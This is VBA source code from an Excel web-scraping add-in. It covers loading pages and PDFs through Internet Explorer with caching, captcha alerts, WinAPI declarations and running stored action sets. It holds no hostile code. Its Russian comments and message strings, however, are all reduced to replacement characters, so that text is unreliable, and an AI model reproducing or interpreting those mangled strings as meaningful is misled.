                AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|</b>: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & _
                    AAset_NAME_ONCAPTCHA$ & "|fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Captcha", bt_Warning
            End If
            
        Else    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            If WP.Options.CaptchaShowPopup Then AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (" & WP.Options.CaptchaAttempts & _
                ") |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Captcha |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & vbNewLine & "<a href='" & RequestURL$ & "'>" & CropURL(RequestURL$, 30) & "</a>", bt_Warning
            
        End If
    End If
    
    
    time2 = GetTickCount
    'LoadFromURL_IE.StatusCode = .Status
    LoadFromURL_IE.FromCache = False
    LoadFromURL_IE.Time = time2 - time1
    
    If WriteCache And (Len(LoadFromURL_IE.text) > 0) Then
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        Set ts = FSO.CreateTextFile(CacheFolder$ & CacheFilename$, True, True)
        ts.Write LoadFromURL_IE.text: ts.Close
        Set ts = Nothing: Set FSO = Nothing
    End If
    
    RequestLastTime = GetTickCount
End Function

Function GetURLerrorDescription(ByVal errNumber) As String
    On Error Resume Next
    Dim hexcode$, errconstant$, errdescription$
    hexcode$ = "0x" & Hex(errNumber)
    errconstant$ = Application.WorksheetFunction.VLookup(hexcode$, URLerrors.UsedRange, 2, 0)
    errdescription$ = Application.WorksheetFunction.VLookup(hexcode$, URLerrors.UsedRange, 3, 0)
    
    GetURLerrorDescription = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & hexcode$ & " (" & errNumber & ")"
    If Len(errconstant$) = 0 Then
        GetURLerrorDescription = GetURLerrorDescription & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    Else
        GetURLerrorDescription = GetURLerrorDescription & vbNewLine & errconstant$ & vbNewLine & errdescription$
    End If
End Function


Function LoadPDF_IE(ByVal RequestURL$, Optional ByRef WP As WebsiteParser, _
        Optional ExtraTimeout&, Optional Download As Boolean, Optional MaxAttempts&, _
        Optional ClipboardFormat$ = "Rich Text Format", Optional DownloadFilename$, _
        Optional SpecialCacheFilename$, Optional WaitForCopiing&) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim CacheFilename$, FSO As Object, ts As Object, CacheFolder$, Timeout&, txt$, i&
    
    If WP Is Nothing Then Set WP = New WebsiteParser: WP.Options.UseCache = 0
    If WP.Options.UseCache Then CacheFolder$ = WP.GetCacheFolderPath
    Timeout& = WP.Options.RequestTimeout
    
    Err.Clear: Dim X: X = IE.Hwnd
    If (Err.Number <> 0) Or (IE Is Nothing) Then Set IE = New SHDocVw.InternetExplorer      'CreateObject("InternetExplorer.Application")
    Set IE.document = Nothing
    For i = 1 To 1000
        DoEvents
    Next
    
    CacheFolder$ = WP.GetCacheFolderPath    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    
Label_LoadPDF_IE:
    
    Set FSO = CreateObject("scripting.filesystemobject")
    If Len(Trim(SpecialCacheFilename$)) Then
        CacheFilename$ = SpecialCacheFilename$
    Else
        CacheFilename$ = Replace(Replace(Replace(RequestURL$, "https://", ""), "http://", ""), "/", "|fffd|")
    End If
    CacheFilename$ = "PDF=(" & FWF.Replace_symbols(ClipboardFormat$) & ")" & FWF.Replace_symbols(CacheFilename$) & ".txt"
    
    If WP.Options.UseCache And FileExists(CacheFolder$ & CacheFilename$) Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|
        Set ts = FSO.OpenTextFile(CacheFolder$ & CacheFilename$, 1, True, True)
        LoadPDF_IE = ts.ReadAll        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
        ts.Close: Set ts = Nothing
        Exit Function
    End If
    
    WP.WaitAPause
    
    Dim timerstart As Double, PageText$, loopscount&, DownloadPath$
    timerstart = Timer: If Timeout& <= 0 Then Timeout& = 2
    Static FileIndex&
    
    If Download And IsURL(RequestURL$, False) Then
        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        FileIndex& = FileIndex& + 1
        If Trim(DownloadFilename$) = "" Then DownloadFilename$ = "\PDF files\"
        DownloadPath$ = GetFilenameAndCreatePathForFile(DownloadFilename$, "file" & FileIndex& & ".pdf")
        
        If FWF.DownLoadFileFromURL(RequestURL$, DownloadPath$) Then
            RequestURL$ = DownloadPath$
        Else
            If TEST_ACTIONS_MODE Or WP.Options.ShowErrors Then
                AddBalloon "<b>|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| PDF |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|</b>" & vbNewLine & _
                    "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| PDF |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| IE|fffd|" & vbNewLine & _
                    "|fffd||fffd||fffd||fffd||fffd||fffd|: " & RequestURL$ & "" & vbNewLine & "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|: " & DownloadPath$ & "" & vbNewLine & DEBUG_GetErrorPoint, bt_Attention
            End If
            Exit Function
        End If
    End If
    
PDF_IE_Start_Label:
    IE.document.body.outerHTML = ""
    Err.Clear
    
    ' IE.Navigate "about:blank"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| IE... |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|...
    'WaitForIE Timeout&
    
    IE.Visible = True
    IE.Navigate RequestURL$
    WaitForIE Timeout&
    
    ' Debug.Print "IE: Busy = " & IE.Busy & ",  readyState = " & IE.readyState
    If Err.Number = 462 Then
        loopscount& = loopscount& + 1
        If loopscount& = 1 Then
            IE.Quit
            Set IE = New SHDocVw.InternetExplorer
            Err.Clear
            GoTo PDF_IE_Start_Label
        End If
    End If
    'If Err Then Debug.Print Err.Number, Err.Description
    
    WP.WaitAPause ExtraTimeout
    
    txt$ = CopyPageContentFromIE(MaxAttempts, ClipboardFormat, WaitForCopiing&)
    
    If Len(txt$) Then
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        Set ts = FSO.CreateTextFile(CacheFolder$ & CacheFilename$, True, True)
        ts.Write txt$: ts.Close
        Set ts = Nothing: Set FSO = Nothing
    End If
    LoadPDF_IE = txt$
    
End Function

Function GetFilenameFromURL(ByVal txt) As String
    On Error Resume Next
    If InStr(1, txt, "?") Then txt = Split(txt, "?")(0)    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| GET-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    GetFilenameFromURL = FWF.Replace_symbols(Split(txt, "/")(UBound(Split(txt, "/"))))
End Function

Attribute VB_Name = "mod_Declarations"
'---------------------------------------------------------------------------------------
' Module        : mod_Declarations
' Author        : Igor Vakhnenko            Date: 13.11.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Explicit: Option Compare Text: Option Private Module

#If VBA7 Then        ' Office 2010-2016
    Public Declare PtrSafe Sub keybd_event Lib "USER32" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Integer, ByVal dwExtraInfo As Integer)

    Public Declare PtrSafe Function PostMessage Lib "USER32" Alias "PostMessageA" (ByVal Hwnd As LongPtr, ByVal wMsg As Long, ByVal wParam As LongPtr, lParam As Any) As LongPtr
    Public Declare PtrSafe Function SendMessage Lib "USER32" Alias "SendMessageA" (ByVal Hwnd As LongPtr, ByVal wMsg As Long, ByVal wParam As LongPtr, lParam As Any) As LongPtr
    '|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    Public Declare PtrSafe Function FindWindow Lib "USER32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
    '|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    #If Win64 Then
        Public Declare PtrSafe Function GetWindowLong Lib "USER32" Alias "GetWindowLongPtrA" (ByVal Hwnd As LongPtr, ByVal nIndex As Long) As LongPtr
    #Else
        Public Declare PtrSafe Function GetWindowLong Lib "USER32" Alias "GetWindowLongA" (ByVal Hwnd As LongPtr, ByVal nIndex As Long) As LongPtr
    #End If
    '|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    Public Declare PtrSafe Function SetWindowLong Lib "USER32" Alias "SetWindowLongA" (ByVal Hwnd As LongPtr, ByVal nIndex As Long, ByVal dwNewLong As LongPtr) As Long
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    Public Declare PtrSafe Function ShowWindow Lib "user32.dll" (ByVal Hwnd As LongPtr, ByVal nCmdShow As Long) As LongPtr
    Public Declare PtrSafe Function SetForegroundWindow Lib "USER32" (ByVal Hwnd As LongPtr) As LongPtr

    Public Declare PtrSafe Function SetLayeredWindowAttributes Lib "USER32" (ByVal Hwnd As LongPtr, ByVal crey As Byte, ByVal bAlpha As Byte, ByVal dwFlags As Long) As LongPtr
    Public Declare PtrSafe Function FindWindowEx Lib "USER32" Alias "FindWindowExA" (ByVal hWnd1 As LongPtr, ByVal hWnd2 As LongPtr, ByVal lpsz1 As String, ByVal lpsz2 As String) As LongPtr

    Public Declare PtrSafe Function GetTickCount Lib "kernel32" () As Long

    Public Declare PtrSafe Function SHCreateDirectoryEx Lib "shell32" Alias "SHCreateDirectoryExA" (ByVal Hwnd As LongPtr, ByVal pszPath As String, ByVal psa As Any) As LongPtr
    Public Declare PtrSafe Function SHChangeNotify Lib "shell32.dll" (ByVal wEventID As Long, ByVal uFlags As Long, ByVal dwItem1 As Long, ByVal dwItem2 As Long) As LongPtr
    Public Declare PtrSafe Function GetKeyState Lib "USER32" (ByVal vKey As Long) As Integer

#Else        ' Office 2003-2007
    Public Declare Sub keybd_event Lib "USER32" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Integer, ByVal dwExtraInfo As Integer)

    Public Declare Function PostMessage Lib "USER32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
    Public Declare Function SendMessage Lib "USER32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
    Public Declare Function FindWindow Lib "USER32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
    Public Declare Function GetWindowLong Lib "USER32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long) As Long
    Public Declare Function SetWindowLong Lib "USER32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
    Public Declare Function ShowWindow Lib "user32.dll" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
    Public Declare Function SetForegroundWindow Lib "USER32" (ByVal hwnd As Long) As Long

    Public Declare Function SetLayeredWindowAttributes Lib "USER32" (ByVal hwnd As Long, ByVal crey As Byte, ByVal bAlpha As Byte, ByVal dwFlags As Long) As Long
    Public Declare Function FindWindowEx Lib "USER32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long

    Public Declare Function GetTickCount Lib "kernel32" () As Long

    Public Declare Function SHCreateDirectoryEx Lib "shell32" Alias "SHCreateDirectoryExA" (ByVal hwnd As Long, ByVal pszPath As String, ByVal psa As Any) As Long
    Public Declare Function SHChangeNotify Lib "shell32.dll" (ByVal wEventID As Long, ByVal uFlags As Long, ByVal dwItem1 As Long, ByVal dwItem2 As Long) As Long
    Public Declare Function GetKeyState Lib "USER32" (ByVal vKey As Long) As Integer

#End If

Public Const C_USERFORM_CLASSNAME = "ThunderDFrame", GWL_EXSTYLE = (-20), OutputDataIntoAllColumns = "st", GWL_STYLE = (-16)
Public Const WS_CAPTION = &HC00000, WS_EX_LAYERED = &H80000, LWA_ALPHA = &H2&, WS_SIZEBOX = &H40000, WS_EX_TOOLWINDOW = &H80


Public Const DEFAULT_ACTION_NAME$ = "<|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|>", ROOT_FOLDER_PREFIX$ = "<|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|>"
Public Const PARSER_EXT$ = ".xlp", PARSER_VERSION& = 2, DEFAULT_QUERY_TIMEOUT& = 6, CACHE_FOLDER_NAME$ = "ParserCache"
Public Const ARSEP$ = "~|01||03||02|~", PARSER_ENCRYPT_KEY$ = "WebsiteParser", PARSER_DATA_NAME$ = "ParserData"
Public Const DEFAULT_COLUMN_WIDTH = 8.5, DEFAULT_SHEET_NAME$ = "Parser", REPLACE_TABLE_EXT$ = ".rt", RESOURCE_FILE_EXT$ = ".pres", CAPTCHA_URL_VAR_NAME$ = "Captcha_URL"
Public Const ACTION_SET_NAME_BEFORESTART$ = "Parser_BeforeStart"
Public Const ACTION_SET_NAME_ONSTART$ = "Parser_Start"
Public Const ACTION_SET_NAME_ONFINISH$ = "Parser_Finish"
Public Const ACTION_SET_NAME_ONCAPTCHA$ = "Parser_OnCaptcha"
Public Const ACTION_SET_NAME_MORE_PROXY$ = "Parser_NeedsMoreProxy"
Public Const ACTION_SET_NAME_ON_PROXY_CHANGED$ = "Parser_OnProxyChanged"
Public Const ACTION_SET_NAME_BEFORE_SI$ = "Parser_BeforeSI"
Public Const ACTION_SET_NAME_AFTER_SI$ = "Parser_AfterSI"
Public Const ACTION_SET_NAME_AFTER_LAST_LEVEL$ = "Parser_AfterLastLevel"
Public Const TEMP_ARSEP$ = "|fffd||fffd||fffd|"
Public Const WEB_QUERY_WORKBOOK_NAME$ = "WEB_QUERY_TEMP_WORKBOOK.xls", PARSER_INI_FILENAME$ = "parser.ini"
Public Const WEBSITE_URL_VARNAME$ = "%WebsiteURL%", LAST_USED_URL_VARNAME$ = "%LastUsedURL%", RESPONSE_VARNAME$ = "%g-recaptcha-response%"
Public Const OUTPUT_ARSEP_REPLACER$ = "; "
Public Const KEYEVENTF_KEYUP = &H2, BM_CLICK = 245, DEFAULT_COLUMN_HEADER_COLOR = rgbLightGray, DICTIONARY_SOURCEDATA_NAME$ = "Parser_SourceData"

Public RowVariables As Dictionary, ParserVariables As Dictionary, CookiesStore As Dictionary, RequestHeadersStore As Dictionary
Public ActiveAAs As ArrayActions, SelectedActionCodename$, v_1&, v_2&, DESCRIPTION_MODE As Boolean, DESCRIPTION_MODE_FOR_ITEM As Boolean, DescriptionText As String
Public RunningParser As WebsiteParser, GlobalError As ErrObject, SHOW_PI2 As Boolean, TEST_ACTIONS_MODE As Boolean, toi&, SelectedObjectName_F_Objects
Public MacroDestinationRange As Range, MacroReturnPoint As Long, CurrentPIuserform As F_ProgressNew, LastOpenedWB As Workbook
Public Dictionaries As Dictionary    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Public IAEC As Long, LIAT As Date, CreatedParserFilename$, LAST_USED_URL$, StopMainActions As Long, LastTestActionsResult$
Public HTML_DOCUMENT As HTMLDocument, EditingVariable_XMLNode As Object, SelectFromArrayResult As Variant, OLIM As Long
Public JumpToNextLevel As Boolean, NextLevelSourceValue As String, ResponseHeadersFromCache$, to_RW As String, orc&
Public PLUGIN_LIST As Dictionary, PLUGIN_FUNCTION_CATEGORIES As Dictionary, DEBUG_LevelInfo$, DEBUG_ActionIndex&

Public Const HTML_SP$ = "thinsp=32;nbsp=32;pound=163;euro=8364;para=182;sect=167;copy=169;reg=174;trade=8482;deg=176;plusmn=177;frac14=188;frac12=189;" & _
       "frac34=190;times=215;divide=247;fnof=402;Alpha=913;Beta=914;Gamma=915;Delta=916;Epsilon=917;Zeta=918;Eta=919;Theta=920;" & _
       "Iota=921;Kappa=922;Lambda=923;Mu=924;Nu=925;Xi=926;Omicron=927;Pi=928;Rho=929;Sigma=931;Tau=932;Upsilon=933;Phi=934;" & _
       "Chi=935;Psi=936;Omega=937;alpha=945;beta=946;gamma=947;delta=948;epsilon=949;zeta=950;eta=951;theta=952;iota=953;kappa=954;" & _
       "lambda=955;mu=956;nu=957;xi=958;omicron=959;pi=960;rho=961;sigma=963;tau=964;upsilon=965;phi=966;chi=967;psi=968;omega=969;" & _
       "sigmaf=962;larr=8592;uarr=8593;rarr=8594;darr=8595;harr=8596;spades=9824;clubs=9827;hearts=9829;" & _
       "diams=9830;quot=34;amp=38;lt=60;gt=62;hellip=8230;prime=8242;ndash=8211;mdash=8212;lsquo=8216;rsquo=8217;sbquo=8218;" & _
       "ldquo=8220;rdquo=8221;bdquo=8222;laquo=171;raquo=187;ensp=8194;emsp=8195;shy=173;ordm=186;ordf=170;permil=8240;brvbar=166;" & _
       "micro=181;oline=8254;acute=180;sup1=185;sup2=178;sup3=179;not=172;frasl=8260;minus=8722;le=8804;ge=8805;asymp=8776;ne=8800;" & _
       "equiv=8801;radic=8730;infin=8734;sum=8721;prod=8719;part=8706;int=8747;forall=8704;exist=8707;empty=8709;Oslash=216;" & _
       "isin=8712;notin=8713;ni=8727;sub=8834;sup=8835;nsub=8836;sube=8838;supe=8839;oplus=8853;otimes=8855;perp=8869;ang=8736;" & _
       "and=8743;or=8744;cap=8745;cup=8746;cent=162;current=164;yen=165;bull=8226;middot=183;loz=9674;crarr=8629;" & _
       "Aacute=193;aacute=225;Acirc=194;acirc=226;AElig=198;aelig=230;Agrave=192;agrave=224;Aring=197;aring=229;Atilde=195;" & _
       "atilde=227;Auml=196;auml=228;Ccedil=199;ccedil=231;Eacute=201;eacute=233;Ecirc=202;ecirc=234;Egrave=200;egrave=232;ETH=208;" & _
       "eth=240;Euml=203;euml=235;Iacute=205;iacute=237;Icirc=206;icirc=238;iexcl=161;Igrave=204;igrave=236;iquest=191;Iuml=207;iuml=239;" & _
       "Ntilde=209;ntilde=241;Oacute=211;oacute=243;Ocirc=212;ocirc=244;OElig=338;oelig=339;Ograve=210;ograve=242;oslash=248;Otilde=213;otilde=245;" & _
       "Ouml=214;ouml=246;szlig=223;THORN=222;thorn=254;Uacute=218;uacute=250;Ucirc=219;ucirc=251;Ugrave=217;ugrave=249;Uuml=220;uuml=252;Yacute=221;yacute=253;yuml=255"

Public Enum SELECT_OPTIONS
    so_None = 0: so_MultiSelect = 1: so_SetFirst = 2: so_OnlyOne = 4: so_All = -1
End Enum

Public Enum VirtualKeys    ' Virtual Keys, Standard Set
    VK_LBUTTON = &H1: VK_RBUTTON = &H2: VK_CANCEL = &H3: VK_MBUTTON = &H4
    'VK_MBUTTON = &H4 -  NOT contiguous with L RBUTTON
    VK_BACK = &H8: VK_TAB = &H9: VK_CLEAR = &HC: VK_RETURN = &HD
    VK_SHIFT = &H10: VK_CONTROL = &H11: VK_MENU = &H12: VK_PAUSE = &H13: VK_CAPITAL = &H14: VK_ESCAPE = &H1B
    VK_SPACE = &H20: VK_PRIOR = &H21: VK_NEXT = &H22: VK_END = &H23: VK_HOME = &H24
    VK_LEFT = &H25: VK_UP = &H26: VK_RIGHT = &H27: VK_DOWN = &H28: VK_SELECT = &H29: VK_PRINT = &H2A
    VK_EXECUTE = &H2B: VK_SNAPSHOT = &H2C: VK_INSERT = &H2D: VK_DELETE = &H2E: VK_HELP = &H2F
 
    ' VK_A thru VK_Z are the same as their ASCII equivalents: 'A' thru 'Z'
    ' VK_0 thru VK_9 are the same as their ASCII equivalents: '0' thru '9'

    VK_NUMPAD0 = &H60: VK_NUMPAD1 = &H61: VK_NUMPAD2 = &H62: VK_NUMPAD3 = &H63: VK_NUMPAD4 = &H64
    VK_NUMPAD5 = &H65: VK_NUMPAD6 = &H66: VK_NUMPAD7 = &H67: VK_NUMPAD8 = &H68: VK_NUMPAD9 = &H69
    VK_MULTIPLY = &H6A: VK_ADD = &H6B: VK_SEPARATOR = &H6C: VK_SUBTRACT = &H6D: VK_DECIMAL = &H6E: VK_DIVIDE = &H6F
    VK_F1 = &H70: VK_F2 = &H71: VK_F3 = &H72: VK_F4 = &H73: VK_F5 = &H74: VK_F6 = &H75: VK_F7 = &H76
    VK_F8 = &H77: VK_F9 = &H78: VK_F10 = &H79: VK_F11 = &H7A: VK_F12 = &H7B
    VK_F13 = &H7C: VK_F14 = &H7D: VK_F15 = &H7E: VK_F16 = &H7F: VK_F17 = &H80: VK_F18 = &H81
    VK_F19 = &H82: VK_F20 = &H83: VK_F21 = &H84: VK_F22 = &H85: VK_F23 = &H86: VK_F24 = &H87
    VK_NUMLOCK = &H90: VK_SCROLL = &H91
 
    '   VK_L VK_R - left and right Alt, Ctrl and Shift virtual keys.
    '   Used only as parameters to GetAsyncKeyState() and GetKeyState().
    '   No other API or message will distinguish left and right keys in this way.
    VK_LSHIFT = &HA0: VK_RSHIFT = &HA1: VK_LCONTROL = &HA2: VK_RCONTROL = &HA3: VK_LMENU = &HA4: VK_RMENU = &HA5
 
    VK_ATTN = &HF6: VK_CRSEL = &HF7: VK_EXSEL = &HF8: VK_EREOF = &HF9: VK_PLAY = &HFA
    VK_ZOOM = &HFB: VK_NONAME = &HFC: VK_PA1 = &HFD: VK_OEM_CLEAR = &HFE
    
    VK_A = 65: VK_C = 67
End Enum
'==========================================================================================

Public Function KeyPressed(ByVal vKey As VirtualKeys) As Boolean
    KeyPressed = GetKeyState(vKey) < 0
End Function

' ======================================== USERFORM WINAPI Actions ============================
Sub UserForm_AddCollapseButton(ByVal FormCaption As String)
    On Error Resume Next: Err.Clear
    #If VBA7 Then
        Dim ihWnd As LongPtr, iStyle As LongPtr
    #Else
        Dim ihWnd As Long, iStyle As Long
    #End If
    ihWnd = FindWindow(vbNullString, FormCaption)
    iStyle = GetWindowLong(ihWnd, -16&)
    SetWindowLong ihWnd, -16&, iStyle Or &H20000

    '    iStyle = GetWindowLong(ihWnd, -20&)
    '    SetWindowLong ihWnd, -20&, iStyle Or &H40000

    'ShowWindow ihWnd, 5&
    ' Debug.Print Err.Number, Err.Description
End Sub

'    '  Exactly one of the following flags specifying how to show the window:
'    SW_HIDE = 0    ' Hide the window.
'    SW_MAXIMIZE = 3    ' Maximize the window.
'    SW_MINIMIZE = 6    ' Minimize the window.
'    SW_RESTORE = 9    ' Restore the window (not maximized nor minimized).
'    SW_SHOW = 5    ' Show the window.
'    SW_SHOWMAXIMIZED = 3    ' Show the window maximized.
'    SW_SHOWMINIMIZED = 2    ' Show the window minimized.
'    SW_SHOWMINNOACTIVE = 7    ' Show the window minimized but do not activate it.
'    SW_SHOWNA = 8    ' Show the window in its current state but do not activate it.
'    SW_SHOWNOACTIVATE = 4    ' Show the window in its most recent size and position but do not activate it.
'    SW_SHOWNORMAL = 1    ' Show the window and activate it (as usual).

Sub UserForm_MINIMIZE(ByRef UF As Object)
    On Error Resume Next: Dim ihWnd As Long, iStyle As Long
    ihWnd = FindWindow(vbNullString, UF.Caption)
    ShowWindow ihWnd, 6        ' SW_MINIMIZE
End Sub

Sub UserForm_MAXIMIZE(ByRef UF As Object)
    On Error Resume Next: Dim ihWnd As Long, iStyle As Long
    ihWnd = FindWindow(vbNullString, UF.Caption)
    ShowWindow ihWnd, 9        ' SW_MAXIMIZE
End Sub
Attribute VB_Name = "mod_Functions"
'---------------------------------------------------------------------------------------
' Module        : mod_Functions
' Author        : EducatedFool                     Date: 20.03.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module

Function Get_DOMElement_FromXML(ByRef txt) As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument:  Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        .preserveWhiteSpace = True
        If txt Like "<?*>" Then
            If .LoadXML(txt) Then Set Get_DOMElement_FromXML = .DocumentElement
        End If
    End With
End Function

Function EasyHash(ByRef txt) As Long
    ' |fffd| nerv    www.excelworld.ru/forum/2-917-1
    Dim i&, Hash&
    For i = 1 To Len(txt)
        Hash = i + 1664525 * AscB(Mid(txt, i, 1)) + 1013904223
        EasyHash = (Hash / i And 1048575) + EasyHash
    Next
End Function

Sub UpdateParserSettingsVariables()
    On Error Resume Next
    F_ParserSettings_Edit.RefreshVariablesList
End Sub

' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Function RunActionSetFromStorage(ByVal ASetName$, Optional ByRef InputValue$, Optional ByRef sh As Worksheet) As String
    On Error Resume Next
    If ASetName$ = "" Then Exit Function
    If sh Is Nothing Then Set sh = sh_actions
    
    Dim ra As Range:    Set ra = sh.Range(sh.Range("a2"), sh.Range("a" & sh.Rows.Count).End(xlUp)).Resize(, 5)
    If ra.row = 1 Then Exit Function
    Dim arr, i&, ASet As ActionSet, XML As DOMDocument
    arr = ra.value
    For i = LBound(arr) To UBound(arr)
        If Trim(arr(i, 2)) = ASetName$ Then
            Set ASet = New ActionSet
            With ASet
                If Len(Trim(arr(i, 3))) Then ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Set XML = CreateObject("Microsoft.XMLDOM")
                    XML.preserveWhiteSpace = True
                    If XML.LoadXML(arr(i, 3)) Then
                        Set .Actions = New ArrayActions
                        .Actions.LoadFromXML XML.DocumentElement
                        .Execute InputValue$
                    End If
                    Set XML = Nothing
                End If
            End With
            Exit For
        End If
    Next i
End Function

